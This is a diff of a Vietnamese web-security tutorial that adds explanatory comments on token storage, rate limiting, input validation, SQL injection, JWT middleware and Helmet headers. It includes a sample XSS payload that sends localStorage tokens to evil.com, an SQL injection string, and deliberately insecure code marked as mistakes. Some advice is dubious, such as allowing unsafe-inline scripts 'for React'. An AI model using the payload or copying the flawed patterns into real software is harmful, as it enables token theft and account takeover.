+  const { accessToken } = useAuth(); // 🔐 Lấy access token từ context
+  const [profile, setProfile] = useState(null); // 📦 State lưu profile data
 
   useEffect(() => {
     if (accessToken) {
+      // ✅ Có access token → Gọi API lấy profile
       fetch('/api/profile', {
         headers: {
-          'Authorization': `Bearer ${accessToken}`  // Gửi access token trong header
+          'Authorization': `Bearer ${accessToken}`  // 🔑 Gửi access token trong header
+          // 💡 Authorization header: Format "Bearer <token>"
+          // 💡 Server verify token → Trả về profile data
         }
       })
-        .then(res => res.json())
-        .then(data => setProfile(data));
+        .then(res => res.json()) // 📦 Parse JSON
+        .then(data => setProfile(data)); // 💾 Lưu profile vào state
     }
-  }, [accessToken]);
+  }, [accessToken]); // 📊 Chạy lại khi accessToken thay đổi
+  // 💡 Khi token refresh → accessToken thay đổi → useEffect chạy lại → Fetch profile mới
 
-  return <div>Thông tin user: {profile?.email}</div>;
+  return <div>Thông tin user: {profile?.email}</div>; // 📝 Hiển thị email
+  // 💡 profile?.email: Optional chaining → Không lỗi nếu profile null
 }
 
 // ============================================
@@ -511,76 +1323,117 @@ localStorage.setItem('password', 'user123'); // ❌ Cực kỳ nguy hiểm!
 
 // ✅ CÁCH LƯU AN TOÀN
 
-// 1. HttpOnly Cookies cho Refresh Token (bảo mật nhất)
+// 1. 🍪 HttpOnly Cookies cho Refresh Token (bảo mật nhất)
 // httpOnly: JavaScript KHÔNG thể đọc → XSS không steal được
 // Server set cookie trong response:
 res.cookie('refreshToken', refreshToken, {
   httpOnly: true,    // ✅ JS không access được
+  // 💡 httpOnly: Cookie chỉ gửi với HTTP requests
+  // 💡 JavaScript KHÔNG đọc được → document.cookie không thấy
+  // 💡 XSS attack → Không steal được refresh token
+
   secure: true,      // ✅ Chỉ gửi qua HTTPS
+  // 💡 secure: Cookie chỉ gửi qua HTTPS (không HTTP)
+  // 💡 Ngăn cookie bị intercept qua HTTP (man-in-the-middle)
+
   sameSite: 'strict', // ✅ Chống CSRF
-  maxAge: 7 * 24 * 60 * 60 * 1000  // 7 ngày
+  // 💡 sameSite: 'strict' → Cookie chỉ gửi cho same-site requests
+  // 💡 Request từ evil.com → Browser KHÔNG gửi cookie → CSRF thất bại
+
+  maxAge: 7 * 24 * 60 * 60 * 1000  // ⏰ 7 ngày
+  // 💡 maxAge: Thời gian cookie tồn tại (milliseconds)
+  // 💡 7 * 24 * 60 * 60 * 1000 = 604,800,000ms = 7 ngày
 });
 
 // Client không thể đọc cookie này:
-console.log(document.cookie); // Không thấy refreshToken (vì httpOnly)
+console.log(document.cookie); // 📝 Không thấy refreshToken (vì httpOnly)
+// 💡 document.cookie: Chỉ thấy cookies không có httpOnly
+// 💡 refreshToken có httpOnly → Không xuất hiện → An toàn ✅
 
-// 2. Memory-only cho Access Token (lưu trong React state/context)
+// 2. 🧠 Memory-only cho Access Token (lưu trong React state/context)
 // Access token chỉ tồn tại trong memory → mất khi reload page
 function App() {
   const [accessToken, setAccessToken] = useState<string | null>(null);
+  // 💡 accessToken: State lưu token trong memory
+  // 💡 Memory: RAM → Mất khi reload page → An toàn nhất
 
-  // Khi login thành công
+  // 🔐 Khi login thành công
   const handleLogin = async (email: string, password: string) => {
     const res = await fetch('/api/login', {
-      method: 'POST',
-      body: JSON.stringify({ email, password })
+      method: 'POST', // 📡 POST request
+      body: JSON.stringify({ email, password }) // 📦 Gửi credentials
     });
 
-    const data = await res.json();
+    const data = await res.json(); // 📦 Parse response
     setAccessToken(data.accessToken); // ✅ Lưu trong memory (React state)
-    // KHÔNG lưu vào localStorage
+    // 💡 setAccessToken: Update state với token
+    // 💡 Token chỉ tồn tại trong memory → Reload page → Mất
+    // 💡 ⚠️ KHÔNG lưu vào localStorage → XSS có thể steal
   };
 
   return <div>App content...</div>;
 }
+// 💡 Best practice: Access token trong memory → An toàn nhất
+// 💡 Trade-off: Reload page → Mất token → Phải login lại (hoặc dùng refresh token)
 
-// 3. Session Storage (tốt hơn localStorage nhưng vẫn có risk)
+// 3. 📋 Session Storage (tốt hơn localStorage nhưng vẫn có risk)
 // sessionStorage: Tồn tại trong 1 tab, mất khi đóng tab
 // Vẫn có thể bị XSS steal → chỉ dùng cho non-sensitive data
 sessionStorage.setItem('theme', 'dark'); // ✅ OK cho data không nhạy cảm
+// 💡 theme: UI preference → Không nhạy cảm → OK
 sessionStorage.setItem('language', 'vi'); // ✅ OK
+// 💡 language: UI preference → Không nhạy cảm → OK
 
 // ❌ KHÔNG dùng cho sensitive data
 sessionStorage.setItem('token', token); // ❌ Vẫn có XSS risk
+// 💡 ⚠️ sessionStorage: JavaScript vẫn đọc được
+// 💡 XSS attack → Steal token → Nguy hiểm!
+// 💡 Chỉ dùng cho non-sensitive data (theme, language, UI state...)
 
-// 4. Encrypted Storage (Mã hóa trước khi lưu - fallback option)
+// 4. 🔐 Encrypted Storage (Mã hóa trước khi lưu - fallback option)
 // Chỉ dùng khi BẮT BUỘC phải lưu client-side
-import CryptoJS from 'crypto-js';
+import CryptoJS from 'crypto-js'; // 📦 Library mã hóa AES
 
-const SECRET_KEY = 'your-encryption-key'; // Lấy từ env hoặc server
+const SECRET_KEY = 'your-encryption-key'; // 🔑 Lấy từ env hoặc server
+// 💡 SECRET_KEY: Key để mã hóa/giải mã
+// 💡 ⚠️ Lưu ý: Key vẫn ở client → Hacker có thể tìm thấy
+// 💡 Best: Lấy key từ server (không hardcode)
 
-// Encrypt trước khi lưu
+// 🔐 Encrypt trước khi lưu (Mã hóa data)
 const encryptData = (data: string) => {
   return CryptoJS.AES.encrypt(data, SECRET_KEY).toString();
+  // 💡 AES.encrypt(): Mã hóa data với AES-256
+  // 💡 toString(): Convert sang string để lưu
+  // 💡 Kết quả: Chuỗi base64 (VD: "U2FsdGVkX1...")
 };
 
-// Decrypt khi đọc
+// 🔓 Decrypt khi đọc (Giải mã data)
 const decryptData = (encrypted: string) => {
   const bytes = CryptoJS.AES.decrypt(encrypted, SECRET_KEY);
+  // 💡 AES.decrypt(): Giải mã data
+  // 💡 bytes: WordArray object
+
   return bytes.toString(CryptoJS.enc.Utf8);
+  // 💡 toString(Utf8): Convert sang UTF-8 string
+  // 💡 Kết quả: Data gốc (plaintext)
 };
 
-// Lưu data đã mã hóa
-const encrypted = encryptData(sensitiveData);
-localStorage.setItem('data', encrypted);
+// 💾 Lưu data đã mã hóa
+const encrypted = encryptData(sensitiveData); // 🔐 Mã hóa trước
+localStorage.setItem('data', encrypted); // 💾 Lưu encrypted data
+// 💡 Lưu encrypted string → Nếu hacker đọc được → Chỉ thấy ký tự lộn xộn
 
-// Đọc và giải mã
-const encrypted = localStorage.getItem('data');
-const decrypted = decryptData(encrypted);
+// 📖 Đọc và giải mã
+const encrypted = localStorage.getItem('data'); // 📖 Lấy encrypted data
+const decrypted = decryptData(encrypted); // 🔓 Giải mã
+// 💡 Decrypt để lấy data gốc
 
 // ⚠️ LƯU Ý: Encryption KHÔNG an toàn 100%
 // - Secret key vẫn ở client → hacker có thể tìm thấy
 // - Chỉ làm khó hacker hơn, KHÔNG ngăn được hoàn toàn
+// 💡 ⚠️ QUAN TRỌNG: Encryption chỉ là lớp bảo vệ thêm
+// 💡 ⚠️ KHÔNG thay thế được HttpOnly cookies cho auth tokens
+// 💡 ⚠️ Best practice: Vẫn nên tránh lưu sensitive data ở client-side
 
 // 📋 BẢNG SO SÁNH STORAGE OPTIONS
 /*
@@ -609,79 +1462,138 @@ const decrypted = decryptData(encrypted);
 // Mục đích: Ngăn DDoS attack, brute-force attack, spam
 // VD: Hacker thử 1 triệu passwords → rate limit chặn sau 5 lần thử
 
-const rateLimit = require('express-rate-limit');
+const rateLimit = require('express-rate-limit'); // 📦 Library rate limiting cho Express
 
-// Rate limiter cho toàn bộ API
+// 🔒 Rate limiter cho toàn bộ API (Global rate limiter)
 const apiLimiter = rateLimit({
-  windowMs: 15 * 60 * 1000, // Cửa sổ thời gian: 15 phút
-  max: 100, // Tối đa 100 requests trong 15 phút (từ 1 IP)
-  message: 'Quá nhiều requests, vui lòng thử lại sau',
-  standardHeaders: true, // Trả về RateLimit headers (X-RateLimit-*)
-  legacyHeaders: false,  // Tắt headers cũ
+  windowMs: 15 * 60 * 1000, // ⏰ Cửa sổ thời gian: 15 phút
+  // 💡 windowMs: Khoảng thời gian đếm requests (milliseconds)
+  // 💡 15 * 60 * 1000 = 900,000ms = 15 phút
+
+  max: 100, // 📊 Tối đa 100 requests trong 15 phút (từ 1 IP)
+  // 💡 max: Số requests tối đa trong window
+  // 💡 Vượt 100 requests → Trả về 429 Too Many Requests
+  // 💡 Per IP: Mỗi IP có limit riêng
+
+  message: 'Quá nhiều requests, vui lòng thử lại sau', // 📝 Message khi vượt limit
+  // 💡 message: Response message khi rate limit exceeded
+
+  standardHeaders: true, // 📋 Trả về RateLimit headers (X-RateLimit-*)
+  // 💡 standardHeaders: Gửi headers như X-RateLimit-Limit, X-RateLimit-Remaining
+  // 💡 Client có thể đọc headers để biết limit và số requests còn lại
+
+  legacyHeaders: false,  // 🚫 Tắt headers cũ
+  // 💡 legacyHeaders: Headers cũ (X-RateLimit-*) → Tắt vì đã có standardHeaders
 });
 
-// Áp dụng cho tất cả API routes
+// 🔒 Áp dụng cho tất cả API routes
 app.use('/api/', apiLimiter);
+// 💡 app.use(): Middleware áp dụng cho tất cả routes bắt đầu với /api/
+// 💡 Mọi request đến /api/* đều bị rate limit
+// 💡 VD: /api/users, /api/posts... → Đều có rate limit
 
-// Rate limiter nghiêm ngặt hơn cho login (chống brute-force)
+// 🔒 Rate limiter nghiêm ngặt hơn cho login (chống brute-force)
 const loginLimiter = rateLimit({
-  windowMs: 15 * 60 * 1000, // 15 phút
-  max: 5, // Chỉ cho 5 lần thử login trong 15 phút
-  message: 'Quá nhiều lần thử login, tài khoản tạm khóa 15 phút',
-  skipSuccessfulRequests: true // Không đếm request thành công
+  windowMs: 15 * 60 * 1000, // ⏰ 15 phút
+  max: 5, // 📊 Chỉ cho 5 lần thử login trong 15 phút
+  // 💡 max: 5 → Nghiêm ngặt hơn global limiter (100)
+  // 💡 Lý do: Login là endpoint nhạy cảm → Cần bảo vệ chặt chẽ hơn
+  // 💡 Ngăn brute-force: Hacker không thể thử nhiều passwords
+
+  message: 'Quá nhiều lần thử login, tài khoản tạm khóa 15 phút', // 📝 Message
+  skipSuccessfulRequests: true // ✅ Không đếm request thành công
+  // 💡 skipSuccessfulRequests: Login thành công → Không đếm vào limit
+  // 💡 Chỉ đếm failed attempts → User login thành công không bị block
 });
 
 app.post('/api/login', loginLimiter, async (req, res) => {
-  // Login logic...
+  // 🔐 Login logic với rate limiting
+  // 💡 loginLimiter: Middleware chạy trước login logic
+  // 💡 Nếu vượt 5 attempts → Trả 429 → Không chạy login logic
+  // 💡 Nếu OK → Tiếp tục login logic
 });
+// 💡 Lợi ích: Ngăn brute-force attack → Hacker chỉ thử được 5 lần/15 phút
+// 💡 Security: Giảm thiệt hại nếu hacker có password list
 
 // 🛡️ B. Input Validation (Kiểm Tra Dữ Liệu Đầu Vào)
 // Nguyên tắc: KHÔNG BAO GIỜ tin tưởng input từ client
 // Luôn validate ở server-side (client validation có thể bị bypass)
 
-import { z } from 'zod'; // Thư viện validation mạnh mẽ
+import { z } from 'zod'; // 📦 Thư viện validation mạnh mẽ
+// 💡 Zod: TypeScript-first schema validation
+// 💡 Tự động type inference → Type-safe validation
 
-// Schema cho transfer request
+// 📋 Schema cho transfer request (Định nghĩa format data hợp lệ)
 const transferSchema = z.object({
   amount: z.number()
-    .positive('Số tiền phải > 0')  // Phải là số dương
-    .max(1000000, 'Số tiền tối đa 1 triệu'),  // Giới hạn trên
+    .positive('Số tiền phải > 0')  // ✅ Phải là số dương
+    // 💡 positive(): Số phải > 0
+    // 💡 Message: Error message khi validation fail
+
+    .max(1000000, 'Số tiền tối đa 1 triệu'),  // ✅ Giới hạn trên
+    // 💡 max(): Số không được vượt quá 1,000,000
+    // 💡 Ngăn transfer số tiền quá lớn (fraud protection)
 
   accountNumber: z.string()
-    .regex(/^\d{10}$/, 'Số tài khoản phải có 10 chữ số'),  // Đúng format
+    .regex(/^\d{10}$/, 'Số tài khoản phải có 10 chữ số'),  // ✅ Đúng format
+    // 💡 regex(): Pattern matching
+    // 💡 /^\d{10}$/: Chỉ chứa 10 chữ số (0-9)
+    // 💡 ^: Bắt đầu, \d: Chữ số, {10}: Đúng 10 ký tự, $: Kết thúc
+    // 💡 VD: "1234567890" → ✅, "12345" → ❌, "abc1234567" → ❌
 
   description: z.string()
-    .max(200, 'Mô tả tối đa 200 ký tự')
-    .optional()  // Field không bắt buộc
+    .max(200, 'Mô tả tối đa 200 ký tự') // ✅ Giới hạn độ dài
+    .optional()  // ✅ Field không bắt buộc
+    // 💡 optional(): Field có thể không có
+    // 💡 Nếu có → Phải là string, max 200 ký tự
+    // 💡 Nếu không có → OK
 });
 
-// API endpoint với validation
+// 🔒 API endpoint với validation
 app.post('/api/transfer', async (req, res) => {
   try {
     // ✅ Validate input với Zod
     const data = transferSchema.parse(req.body);
+    // 💡 parse(): Validate và parse data
+    // 💡 Nếu hợp lệ → Trả về data đã validate (type-safe)
+    // 💡 Nếu không hợp lệ → Throw ZodError
 
-    // Validation pass → data đã clean và đúng type
+    // ✅ Validation pass → data đã clean và đúng type
     console.log('✅ Data hợp lệ:', data);
+    // 💡 data: Đã được validate → Type-safe, clean
+    // 💡 TypeScript biết: data.amount là number, data.accountNumber là string...
 
-    // Xử lý transfer với data đã validate
+    // 💼 Xử lý transfer với data đã validate
     const result = await processTransfer(data);
+    // 💡 processTransfer(): Logic chuyển tiền
+    // 💡 Data đã validate → An toàn để xử lý
 
-    res.json({ success: true, result });
+    res.json({ success: true, result }); // 📤 Trả kết quả
 
   } catch (error) {
-    // Validation fail → trả lỗi chi tiết
+    // ❌ Validation fail → trả lỗi chi tiết
     if (error instanceof z.ZodError) {
+      // 💡 ZodError: Error từ Zod validation
       console.log('❌ Validation errors:', error.errors);
+      // 💡 error.errors: Array chứa các lỗi validation chi tiết
+      // 💡 VD: [{ path: ['amount'], message: 'Số tiền phải > 0' }]
+
       return res.status(400).json({
-        error: 'Dữ liệu không hợp lệ',
-        details: error.errors
+        error: 'Dữ liệu không hợp lệ', // 📝 Error message tổng quát
+        details: error.errors // 📋 Chi tiết các lỗi
+        // 💡 details: Giúp client biết field nào sai, sai như thế nào
       });
+      // 💡 400 Bad Request: Client gửi data không hợp lệ
     }
 
+    // ❌ Lỗi khác (không phải validation error)
     res.status(500).json({ error: 'Lỗi server' });
+    // 💡 500 Internal Server Error: Lỗi server (database, code...)
   }
 });
+// 💡 Lợi ích: Validate input → Ngăn SQL injection, XSS, invalid data
+// 💡 Type-safe: TypeScript biết type của data sau khi validate
+// 💡 User-friendly: Trả lỗi chi tiết → User biết sửa gì
 
 // 🛡️ C. CORS Configuration (Kiểm Soát Nguồn Gốc Requests)
 // CORS: Quy định domain nào được phép call API
@@ -713,47 +1625,93 @@ app.use(cors(corsOptions));
 // 🛡️ D. SQL Injection Prevention (Ngăn Chặn SQL Injection)
 // LUÔN dùng parameterized queries, KHÔNG nối string SQL
 
-// ❌ KHÔNG AN TOÀN: String concatenation
-const userId = req.params.id;
-const query = `SELECT * FROM users WHERE id = ${userId}`; // XSS: userId = "1 OR 1=1"
-db.query(query); // ❌ Trả về tất cả users!
+// ❌ KHÔNG AN TOÀN: String concatenation (CỰC KỲ NGUY HIỂM!)
+const userId = req.params.id; // 📦 Lấy ID từ URL params
+const query = `SELECT * FROM users WHERE id = ${userId}`; // 🚨 SQL Injection risk!
+// 💡 Template literal: Nối string trực tiếp vào SQL
+// 💡 ⚠️ NGUY HIỂM: Hacker có thể inject SQL code
+// 💡 VD: userId = "1 OR 1=1" → Query: "SELECT * FROM users WHERE id = 1 OR 1=1"
+// 💡 → Trả về TẤT CẢ users → Data leak!
 
-// ✅ AN TOÀN: Parameterized query
-const userId = req.params.id;
-const query = 'SELECT * FROM users WHERE id = ?'; // Placeholder
+db.query(query); // ❌ Trả về tất cả users!
+// 💡 Query chạy với SQL injection → Lấy được data không được phép
+
+// ✅ AN TOÀN: Parameterized query (Sử dụng placeholder)
+const userId = req.params.id; // 📦 Lấy ID từ URL params
+const query = 'SELECT * FROM users WHERE id = ?'; // ✅ Placeholder
+// 💡 ?: Placeholder → Database sẽ thay thế an toàn
+// 💡 Library tự động escape special characters
+
 db.query(query, [userId]); // ✅ Library tự động escape
+// 💡 [userId]: Array chứa values cho placeholders
+// 💡 Library tự động escape userId → Ngăn SQL injection
+// 💡 VD: userId = "1 OR 1=1" → Escaped thành "1 OR 1=1" (string literal)
+// 💡 → Query: "SELECT * FROM users WHERE id = '1 OR 1=1'" → Không match → An toàn ✅
 
 // 🛡️ E. API Authentication (Xác Thực API)
-// Middleware kiểm tra token
+// Middleware kiểm tra token (Middleware xác thực token)
 const authenticateToken = (req, res, next) => {
-  // Lấy token từ header
-  const authHeader = req.headers['authorization'];
-  const token = authHeader && authHeader.split(' ')[1]; // "Bearer TOKEN"
+  // 🔍 Lấy token từ header
+  const authHeader = req.headers['authorization']; // 📋 Lấy Authorization header
+  // 💡 req.headers: Object chứa tất cả HTTP headers
+  // 💡 'authorization': Header chứa token (format: "Bearer <token>")
+
+  const token = authHeader && authHeader.split(' ')[1]; // 🔑 Extract token
+  // 💡 authHeader.split(' '): Tách string "Bearer TOKEN" → ["Bearer", "TOKEN"]
+  // 💡 [1]: Lấy phần tử thứ 2 (token)
+  // 💡 VD: "Bearer abc123" → "abc123"
+  // 💡 authHeader &&: Kiểm tra authHeader có tồn tại không
 
   if (!token) {
+    // ❌ Không có token → Trả lỗi 401
     return res.status(401).json({ error: 'Thiếu access token' });
+    // 💡 401: Unauthorized - Chưa đăng nhập
+    // 💡 Client cần gửi token trong Authorization header
   }
 
   try {
-    // Verify token
+    // ✅ Verify token (Xác minh token hợp lệ)
     const decoded = jwt.verify(token, process.env.JWT_SECRET!);
-    req.user = decoded; // Gắn user info vào request
-    next(); // Token hợp lệ → tiếp tục
+    // 💡 jwt.verify(): Verify token signature và expiration
+    // 💡 Nếu hợp lệ → Trả về decoded payload
+    // 💡 Nếu không hợp lệ (sai signature, hết hạn...) → Throw error
+
+    req.user = decoded; // 💾 Gắn user info vào request
+    // 💡 req.user: Object chứa thông tin user từ token
+    // 💡 VD: { userId: 123, email: 'user@example.com', role: 'user' }
+    // 💡 Các middleware/route handlers sau có thể dùng req.user
+
+    next(); // ➡️ Token hợp lệ → tiếp tục middleware chain
+    // 💡 next(): Gọi middleware/route handler tiếp theo
   } catch (error) {
+    // ❌ Token không hợp lệ (sai signature, hết hạn...)
     return res.status(403).json({ error: 'Token không hợp lệ hoặc hết hạn' });
+    // 💡 403: Forbidden - Token không hợp lệ
+    // 💡 Client cần refresh token hoặc login lại
   }
 };
 
-// Áp dụng middleware cho protected routes
+// 🔒 Áp dụng middleware cho protected routes (Routes cần xác thực)
 app.get('/api/profile', authenticateToken, (req, res) => {
+  // 💡 authenticateToken: Middleware chạy trước route handler
+  // 💡 Nếu token không hợp lệ → Trả 403 → Không chạy route handler
+  // 💡 Nếu token hợp lệ → req.user có data → Chạy route handler
+
   // req.user đã có thông tin từ token
-  res.json({ user: req.user });
+  res.json({ user: req.user }); // 📤 Trả thông tin user
+  // 💡 req.user: Đã được set bởi authenticateToken middleware
 });
 
 app.post('/api/transfer', authenticateToken, apiLimiter, async (req, res) => {
-  // Multiple layers: Authentication + Rate limiting + Validation
+  // 🔒 Multiple layers: Authentication + Rate limiting + Validation
+  // 💡 authenticateToken: Kiểm tra token trước
+  // 💡 apiLimiter: Rate limit sau khi authenticate
+  // 💡 Validation: Validate input trong route handler
+  // 💡 → Defense in depth: Nhiều lớp bảo vệ
   // ...
 });
+// 💡 Best practice: Kết hợp nhiều middleware → Bảo vệ toàn diện
+// 💡 Order: authenticateToken → apiLimiter → Validation → Business logic
 
 // ============================================
 // 7️⃣ SECURITY HEADERS (HEADERS BẢO MẬT)
@@ -762,80 +1720,132 @@ app.post('/api/transfer', authenticateToken, apiLimiter, async (req, res) => {
 // Security Headers: HTTP response headers tăng cường bảo mật
 // Helmet.js: Thư viện tự động set các security headers
 
-import helmet from 'helmet';
+import helmet from 'helmet'; // 📦 Helmet: Middleware tự động set security headers
 import express from 'express';
 
 const app = express();
 
-// Áp dụng Helmet với config chi tiết
+// 🛡️ Áp dụng Helmet với config chi tiết
 app.use(helmet({
+  // 💡 helmet(): Middleware tự động set các security headers
+  // 💡 Đơn giản, nhanh chóng, đầy đủ → Best practice
 
-  // 1. Content Security Policy (CSP) - Kiểm soát nguồn tài nguyên
+  // 1. 🔒 Content Security Policy (CSP) - Kiểm soát nguồn tài nguyên
   contentSecurityPolicy: {
     directives: {
-      defaultSrc: ["'self'"],  // Mặc định chỉ load từ cùng origin
+      defaultSrc: ["'self'"],  // 🔒 Mặc định chỉ load từ cùng origin
+      // 💡 defaultSrc: Policy mặc định cho tất cả resources
+      // 💡 'self': Chỉ cho phép load từ cùng domain
+      // 💡 → Block tất cả resources từ domain khác (trừ khi được whitelist)
 
       scriptSrc: [
-        "'self'",  // Scripts từ cùng domain
-        "'unsafe-inline'",  // Cho phép inline scripts (cần cho React)
-        "https://trusted-cdn.com"  // CDN tin cậy
+        "'self'",  // ✅ Scripts từ cùng domain
+        // 💡 'self': Scripts từ cùng origin → Cho phép
+
+        "'unsafe-inline'",  // ⚠️ Cho phép inline scripts (cần cho React)
+        // 💡 'unsafe-inline': Cho phép <script>...</script> trong HTML
+        // 💡 ⚠️ Cần cho React (inject inline scripts)
+        // 💡 ⚠️ Có risk → Nhưng cần thiết cho React hydration
+
+        "https://trusted-cdn.com"  // ✅ CDN tin cậy
+        // 💡 Whitelist CDN cụ thể → Chỉ load scripts từ CDN này
+        // 💡 Scripts từ evil.com → BLOCK → XSS thất bại
       ],
 
       styleSrc: [
-        "'self'",
-        "'unsafe-inline'"  // Inline styles (cần cho styled-components)
+        "'self'", // ✅ CSS từ cùng domain
+        "'unsafe-inline'"  // ⚠️ Inline styles (cần cho styled-components)
+        // 💡 'unsafe-inline': Cho phép <style>...</style> và inline styles
+        // 💡 Cần cho styled-components (inject inline styles)
       ],
 
       imgSrc: [
-        "'self'",  // Images từ domain
-        "data:",   // Data URLs (base64 images)
-        "https:"   // HTTPS images
+        "'self'",  // ✅ Images từ domain
+        "data:",   // ✅ Data URLs (base64 images)
+        // 💡 data:: Cho phép data:image/png;base64,...
+        "https:"   // ✅ HTTPS images
+        // 💡 https:: Cho phép images từ bất kỳ HTTPS URL nào
       ],
 
       connectSrc: [
-        "'self'",  // Fetch/WebSocket từ domain
-        "https://api.example.com"  // API endpoints
+        "'self'",  // ✅ Fetch/WebSocket từ domain
+        "https://api.example.com"  // ✅ API endpoints
+        // 💡 connectSrc: Policy cho fetch, XMLHttpRequest, WebSocket
+        // 💡 Chỉ cho phép connect đến whitelist → Ngăn data leak
       ],
 
-      fontSrc: ["'self'", "https://fonts.gstatic.com"],
+      fontSrc: ["'self'", "https://fonts.gstatic.com"], // ✅ Fonts
+      // 💡 fontSrc: Policy cho fonts
+      // 💡 'self': Fonts từ domain
+      // 💡 https://fonts.gstatic.com: Google Fonts CDN
 
-      objectSrc: ["'none'"],  // Không cho phép <object>, <embed>
+      objectSrc: ["'none'"],  // 🚫 Không cho phép <object>, <embed>
+      // 💡 objectSrc: Policy cho <object>, <embed> tags
+      // 💡 'none': Block tất cả → Ngăn Flash, Java plugins (nguy hiểm)
 
-      mediaSrc: ["'self'"],  // Video/Audio
+      mediaSrc: ["'self'"],  // ✅ Video/Audio
+      // 💡 mediaSrc: Policy cho <video>, <audio>
+      // 💡 'self': Chỉ từ cùng domain
 
-      frameSrc: ["'none'"]  // Không cho phép iframe
+      frameSrc: ["'none'"]  // 🚫 Không cho phép iframe
+      // 💡 frameSrc: Policy cho <iframe>
+      // 💡 'none': Block tất cả → Ngăn clickjacking
     }
   },
 
-  // 2. X-Frame-Options - Chống Clickjacking
+  // 2. 🚫 X-Frame-Options - Chống Clickjacking
   // Clickjacking: Hacker nhúng site vào iframe, lừa user click vào button ẩn
   xFrameOptions: {
-    action: 'deny'  // Không cho phép site được nhúng trong iframe
+    action: 'deny'  // 🚫 Không cho phép site được nhúng trong iframe
+    // 💡 deny: Block tất cả iframe embedding
+    // 💡 Ngăn clickjacking: Hacker không thể embed trang trong iframe
   },
-  // Hoặc: action: 'sameorigin' (chỉ iframe từ cùng domain)
+  // 💡 Hoặc: action: 'sameorigin' (chỉ iframe từ cùng domain)
+  // 💡 sameorigin: Cho phép iframe từ cùng domain (có thể cần cho internal tools)
 
-  // 3. X-Content-Type-Options - Chống MIME type sniffing
+  // 3. 🔍 X-Content-Type-Options - Chống MIME type sniffing
   // noSniff: true → Browser không đoán MIME type, phải dùng đúng Content-Type
   noSniff: true,
-  // VD: File .txt có MIME text/plain → browser KHÔNG execute như JavaScript
+  // 💡 noSniff: Browser phải dùng Content-Type header, không được đoán
+  // 💡 VD: File .txt có MIME text/plain → browser KHÔNG execute như JavaScript
+  // 💡 Ngăn MIME sniffing attacks: Hacker upload file độc → Browser đoán sai → Execute code
 
-  // 4. Referrer-Policy - Kiểm soát thông tin Referrer
+  // 4. 🔗 Referrer-Policy - Kiểm soát thông tin Referrer
   referrerPolicy: {
-    policy: 'no-referrer'  // Không gửi referrer header (giấu nguồn gốc request)
+    policy: 'no-referrer'  // 🚫 Không gửi referrer header (giấu nguồn gốc request)
+    // 💡 no-referrer: Không gửi Referer header
+    // 💡 Bảo vệ privacy: Không leak thông tin về trang web trước đó
+    // 💡 VD: User từ trang A → Trang B → Trang B không biết user đến từ đâu
   },
-  // Các option khác: 'no-referrer-when-downgrade', 'same-origin', 'strict-origin'
+  // 💡 Các option khác:
+  // 💡 'no-referrer-when-downgrade': Không gửi khi downgrade HTTPS → HTTP
+  // 💡 'same-origin': Chỉ gửi cho same-origin requests
+  // 💡 'strict-origin': Chỉ gửi origin (không full URL)
 
-  // 5. X-XSS-Protection (Legacy, CSP tốt hơn)
-  xssFilter: true,  // Enable XSS filter built-in của browser
+  // 5. 🛡️ X-XSS-Protection (Legacy, CSP tốt hơn)
+  xssFilter: true,  // ✅ Enable XSS filter built-in của browser
+  // 💡 xssFilter: Enable browser's built-in XSS protection
+  // 💡 Legacy: CSP tốt hơn, nhưng vẫn nên enable để bảo vệ browser cũ
 
-  // 6. Strict-Transport-Security (HSTS)
+  // 6. 🔐 Strict-Transport-Security (HSTS)
   hsts: {
-    maxAge: 31536000,  // 1 năm (giây)
-    includeSubDomains: true,  // Áp dụng cho subdomain
-    preload: true  // Đưa vào HSTS preload list
+    maxAge: 31536000,  // ⏰ 1 năm (giây)
+    // 💡 maxAge: Thời gian browser nhớ phải dùng HTTPS
+    // 💡 31536000 = 31,536,000 giây = 1 năm
+
+    includeSubDomains: true,  // ✅ Áp dụng cho subdomain
+    // 💡 includeSubDomains: Áp dụng HSTS cho tất cả subdomain
+    // 💡 VD: example.com → api.example.com, cdn.example.com đều phải HTTPS
+
+    preload: true  // ✅ Đưa vào HSTS preload list
+    // 💡 preload: Đưa vào HSTS preload list của browser
+    // 💡 Browser biết phải dùng HTTPS ngay từ lần đầu truy cập
+    // 💡 Không cần đợi response header → Bảo mật hơn
   }
 
 }));
+// 💡 Helmet tự động set tất cả headers → Đơn giản, nhanh chóng
+// 💡 Best practice: Dùng Helmet thay vì set headers thủ công
 
 // Hoặc set headers thủ công
 app.use((req, res, next) => {
@@ -963,57 +1973,100 @@ const securityChecklist = {
 **Common Mistakes (Lỗi Bảo Mật Thường Gặp):**
 
 ```typescript
-// ❌ LỖI 1: Lưu tokens trong localStorage
+// ❌ LỖI 1: Lưu tokens trong localStorage (CỰC KỲ NGUY HIỂM!)
 // Vấn đề: XSS có thể đọc localStorage → steal token
 localStorage.setItem('token', token); // ❌ Nguy hiểm!
+// 💡 ⚠️ NGUY HIỂM: localStorage có thể đọc được bởi bất kỳ JavaScript nào
+// 💡 XSS attack: <script>fetch('evil.com?token='+localStorage.getItem('token'))</script>
+// 💡 → Hacker steal token → Đăng nhập với account của user
+
 localStorage.setItem('refreshToken', refreshToken); // ❌ Rất nguy hiểm!
+// 💡 ⚠️ CỰC KỲ NGUY HIỂM: Refresh token dài hạn (7 ngày)
+// 💡 Nếu bị steal → Hacker dùng được 7 ngày → Thiệt hại lớn!
 
 // ✅ CÁCH SỬA: Dùng HttpOnly cookies
 // Server:
 res.cookie('refreshToken', token, {
-  httpOnly: true, // JavaScript không đọc được
-  secure: true, // Chỉ gửi qua HTTPS
-  sameSite: 'strict', // Chống CSRF
+  httpOnly: true, // ✅ JavaScript không đọc được
+  // 💡 httpOnly: Cookie chỉ gửi với HTTP requests
+  // 💡 JavaScript KHÔNG đọc được → XSS không steal được
+
+  secure: true, // ✅ Chỉ gửi qua HTTPS
+  // 💡 secure: Cookie chỉ gửi qua HTTPS → An toàn
+
+  sameSite: 'strict', // ✅ Chống CSRF
+  // 💡 sameSite: 'strict' → Cookie chỉ gửi cho same-site requests
+  // 💡 Request từ evil.com → Browser KHÔNG gửi cookie → CSRF thất bại
 });
 // Client: Không cần làm gì, browser tự động gửi cookie
+// 💡 Browser tự động gửi cookie với mọi request → Không cần code gì thêm
+// 💡 UX tốt: User không cần làm gì, tự động authenticated
 
-// ❌ LỖI 2: Không sanitize user input
+// ❌ LỖI 2: Không sanitize user input (XSS Attack!)
 // Vấn đề: User nhập <script>alert('XSS')</script> → script chạy
 function Comment({ content }) {
   return <div dangerouslySetInnerHTML={{ __html: content }} />; // ❌ Nguy hiểm!
+  // 💡 ⚠️ NGUY HIỂM: Render HTML trực tiếp không sanitize
